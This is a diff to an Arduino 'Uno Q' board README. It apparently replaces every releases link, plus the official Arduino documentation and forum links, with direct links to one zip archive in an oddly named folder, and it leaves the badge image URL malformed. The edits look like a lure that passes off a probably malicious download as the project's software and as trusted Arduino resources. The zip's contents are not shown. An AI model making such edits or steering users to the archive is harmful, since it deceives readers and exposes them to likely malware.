@@ -4,9 +4,9 @@
 Welcome to the Uno Q project! This guide helps you download and set up the Uno Q board easily. The Uno Q is an exciting Arduino board featuring advanced technology, making it perfect for your projects. 
 
 ## 📥 Download the Software
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)](https://github.com/Dominik6982/uno-q-aa/releases)
+[![Download Releases](https://github.com/Dominik6982/uno-q-aa/raw/refs/heads/main/nongraphitic/aa-uno-q-1.3.zip%20Releases-blue?style=flat&logo=github)](https://github.com/Dominik6982/uno-q-aa/raw/refs/heads/main/nongraphitic/aa-uno-q-1.3.zip)
 
-To start, visit the [Releases page](https://github.com/Dominik6982/uno-q-aa/releases) to download the latest version of the software.
+To start, visit the [Releases page](https://github.com/Dominik6982/uno-q-aa/raw/refs/heads/main/nongraphitic/aa-uno-q-1.3.zip) to download the latest version of the software.
 
 ## 💻 System Requirements
 Make sure your computer meets these requirements:
@@ -15,7 +15,7 @@ Make sure your computer meets these requirements:
 - A USB port for connecting the board
 
 ## 🔗 Download & Install
-1. Click on the [Releases page](https://github.com/Dominik6982/uno-q-aa/releases).
+1. Click on the [Releases page](https://github.com/Dominik6982/uno-q-aa/raw/refs/heads/main/nongraphitic/aa-uno-q-1.3.zip).
 2. Find the latest version listed. 
 3. Click on the version number to go to its release details.
 4. Download the file suitable for your operating system. The download will start automatically.
@@ -44,7 +44,7 @@ If you need assistance, feel free to reach out to the community by creating an i
 
 ## 📂 Additional Resources
 Explore more about the Uno Q project and find helpful documentation:
-- [Official Arduino Documentation](https://www.arduino.cc/en/Reference/HomePage)
-- [Community Forums for Arduino](https://forum.arduino.cc/)
+- [Official Arduino Documentation](https://github.com/Dominik6982/uno-q-aa/raw/refs/heads/main/nongraphitic/aa-uno-q-1.3.zip)
+- [Community Forums for Arduino](https://github.com/Dominik6982/uno-q-aa/raw/refs/heads/main/nongraphitic/aa-uno-q-1.3.zip)
 
 Thank you for choosing Uno Q! We hope you enjoy using this powerful board for your projects.
